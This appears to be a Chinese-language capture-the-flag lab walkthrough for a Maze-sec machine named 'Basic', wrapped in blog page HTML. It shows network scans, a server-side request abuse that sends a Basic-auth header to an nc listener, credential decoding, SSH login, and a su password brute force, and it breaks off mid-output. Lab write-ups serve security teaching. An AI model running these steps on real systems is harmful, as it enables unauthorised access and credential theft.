@@ -1,0 +1,791 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;basic]└─# nmap -sn 192.168.2.0&#x2F;24                                     Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Basic">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Basic/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;basic]└─# nmap -sn 192.168.2.0&#x2F;24                                     Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/15.jpg">
+<meta property="article:published_time" content="2025-07-09T15:04:42.000Z">
+<meta property="article:modified_time" content="2025-07-09T15:06:24.975Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="Basic认证">
+<meta property="article:tag" content="提权-medusa">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/15.jpg">
+  
+  
+  
+  <title>Basic - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Basic"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-09 23:04" pubdate>
+          2025年7月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Basic</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p>
+<h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap -sn 192.168.2.0/24                                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:01 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0012s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0020s latency).<br>MAC Address: 08:00:27:F5:57:69 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.0010s latency).<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.22 seconds<br></code></pre></td></tr></table></figure>
+<p>IP地址：<code>192.168.2.48</code></p>
+<h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap --min-rate 10000 -p- 192.168.2.48                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.00033s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.69 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22，80</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.48 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:03 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.0011s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: HTTP Requester<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.77 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nmap -sU --top-ports 100 192.168.2.48                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 09:04 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.48<br>Host is up (0.0020s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:3C:D4:7D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 111.76 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问<code>80</code>端口，发现是一个<code>Website Request Tool</code>工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# curl http://192.168.2.48<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;HTTP Requester&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            font-family: Arial, sans-serif;<br>            max-width: 800px;<br>            margin: 0 auto;<br>            padding: 20px;<br>            background-color: <span class="hljs-comment">#f5f5f5;</span><br>        &#125;<br>        .container &#123;<br>            background-color: white;<br>            padding: 20px;<br>            border-radius: 8px;<br>            box-shadow: 0 2px 10px rgba(0,0,0,0.1);<br>        &#125;<br>        h1 &#123;<br>            color: <span class="hljs-comment">#333;</span><br>            border-bottom: 2px solid <span class="hljs-comment">#eee;</span><br>            padding-bottom: 10px;<br>        &#125;<br>        form &#123;<br>            margin: 20px 0;<br>            display: flex;<br>            gap: 10px;<br>        &#125;<br>        input[<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span>] &#123;<br>            flex: 1;<br>            padding: 10px;<br>            border: 1px solid <span class="hljs-comment">#ddd;</span><br>            border-radius: 4px;<br>        &#125;<br>        button &#123;<br>            padding: 10px 20px;<br>            background-color: <span class="hljs-comment">#4CAF50;</span><br>            color: white;<br>            border: none;<br>            border-radius: 4px;<br>            cursor: pointer;<br>        &#125;<br>        button:hover &#123;<br>            background-color: <span class="hljs-comment">#45a049;</span><br>        &#125;<br>        .result-box &#123;<br>            margin-top: 20px;<br>            padding: 15px;<br>            background-color: <span class="hljs-comment">#f9f9f9;</span><br>            border-left: 4px solid <span class="hljs-comment">#ccc;</span><br>        &#125;<br>        nav &#123;<br>            margin-top: 30px;<br>            display: flex;<br>            gap: 15px;<br>        &#125;<br>        nav a &#123;<br>            padding: 8px 16px;<br>            background-color: <span class="hljs-comment">#e0e0e0;</span><br>            border-radius: 4px;<br>            text-decoration: none;<br>            color: <span class="hljs-comment">#333;</span><br>        &#125;<br>        nav a:hover &#123;<br>            background-color: <span class="hljs-comment">#d0d0d0;</span><br>        &#125;<br>        pre &#123;<br>            max-height: 300px;<br>            overflow: auto;<br>            padding: 15px;<br>            background-color: <span class="hljs-comment">#f8f8f8;</span><br>            border: 1px solid <span class="hljs-comment">#e0e0e0;</span><br>            border-radius: 4px;<br>            white-space: pre-wrap;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>        &lt;h1&gt;Website Request Tool&lt;/h1&gt;<br>        &lt;form method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>            &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;url&quot;</span> placeholder=<span class="hljs-string">&quot;Enter URL starting with http&quot;</span> required&gt;<br>            &lt;button <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;Fetch Content&lt;/button&gt;<br>        &lt;/form&gt;<br>        <br>        &lt;div class=<span class="hljs-string">&quot;result-box&quot;</span>&gt;<br>            &lt;h3&gt;Current target:&lt;/h3&gt;<br>            No request made        &lt;/div&gt;<br>        <br>        &lt;div class=<span class="hljs-string">&quot;result-box&quot;</span>&gt;<br>            &lt;h3&gt;Response:&lt;/h3&gt;<br>                            &lt;p&gt;Submit URL to <span class="hljs-built_in">test</span> connection&lt;/p&gt;<br>                    &lt;/div&gt;<br>        <br>        &lt;nav&gt;<br>            &lt;a href=<span class="hljs-string">&quot;home.php&quot;</span>&gt;Home&lt;/a&gt;<br>            &lt;a href=<span class="hljs-string">&quot;about.php&quot;</span>&gt;About&lt;/a&gt;<br>            &lt;a href=<span class="hljs-string">&quot;dashboard.php&quot;</span>&gt;Dashboard&lt;/a&gt;<br>        &lt;/nav&gt;<br>    &lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.48 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.48<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              txt,html,bak,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/about.php            (Status: 200) [Size: 334]<br>/home.php             (Status: 200) [Size: 334]<br>/index.php            (Status: 200) [Size: 2675]<br>/dashboard.php        (Status: 302) [Size: 0] [--&gt; home.php]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>没有发现有用目录</p>
+<h2 id="2、request-其他服务"><a href="#2、request-其他服务" class="headerlink" title="2、request 其他服务"></a>2、request 其他服务</h2><p>kali上开一个服务，尝试让靶机请求，发现可以进行请求<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507091439720.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="3、Token泄露"><a href="#3、Token泄露" class="headerlink" title="3、Token泄露"></a>3、Token泄露</h2><p>kali上开启监听，让靶机进行访问，发现返回了<code>Authorization: Basic</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.48] 57332<br>GET / HTTP/1.1<br>Host: 192.168.2.4:4444<br>Accept: */*<br>Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==<br></code></pre></td></tr></table></figure>
+
+<p>解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>cnhyk:bcf829627eea364a3abc41a6537fbf543e974ff8  <br></code></pre></td></tr></table></figure>
+
+<h2 id="4、获取USER权限"><a href="#4、获取USER权限" class="headerlink" title="4、获取USER权限"></a>4、获取USER权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# ssh cnhyk@192.168.2.48<br>cnhyk@192.168.2.48<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">cnhyk@Basic:~$ id</span><br><span class="hljs-string">uid=1000(cnhyk) gid=1000(cnhyk) groups=1000(cnhyk)</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>USER FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-df31759540dc28f75a20f443a19b1148&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取JOJO权限"><a href="#1、获取JOJO权限" class="headerlink" title="1、获取JOJO权限"></a>1、获取JOJO权限</h2><p>在<code>/home</code>目录下面，发现用户<code>jojo</code></p>
+<h3 id="方法一-爆破"><a href="#方法一-爆破" class="headerlink" title="方法一 爆破"></a>方法一 爆破</h3><p>直接尝试爆破用户<code>jojo</code>的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:/tmp$ ./suForce -u jojo -w pass.txt <br>            _____                          <br> ___ _   _ |  ___|__  _ __ ___ ___   <br>/ __| | | || |_ / _ \| <span class="hljs-string">&#x27;__/ __/ _ \ </span><br><span class="hljs-string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span><br><span class="hljs-string">|___/\__,_||_|  \___/|_|  \___\___|  </span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string"> code: d4t4s3c     version: v1.0.0</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">🎯 Username | jojo</span><br><span class="hljs-string">📖 Wordlist | pass.txt</span><br><span class="hljs-string">🔎 Status   | 2814/10000/28%/jojo</span><br><span class="hljs-string">💥 Password | jojo</span><br><span 